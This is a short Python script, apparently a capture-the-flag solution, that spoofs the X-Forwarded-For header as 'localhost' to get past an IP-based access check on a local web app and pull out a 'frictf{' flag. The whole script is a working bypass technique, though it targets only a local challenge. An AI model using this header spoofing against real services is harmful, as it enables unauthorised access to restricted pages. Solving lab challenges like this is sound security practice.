import requests


url = "http://localhost:3000"
s = requests.Session()

s.get(url)
s.headers['X-Forwarded-For'] = 'localhost'
r = s.get(url + "/")
fstart = r.text.index('frictf{')
fend = r.text.index('}', fstart)
flag = r.text[fstart:fend+1]
print(flag)
